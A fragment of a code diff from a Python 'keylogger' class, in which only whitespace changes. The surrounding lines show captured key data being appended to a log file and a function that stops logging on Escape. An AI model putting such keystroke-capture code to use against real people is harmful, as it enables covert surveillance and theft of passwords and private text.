@@ -27,7 +27,8 @@ class keylogger:
 
         with open(logFile, "a") as l:
             l.write(keydata)
-            
+    
+     
     def stopKeyLogger(key):
         if key == Key.esc and Key.f2:
             return False
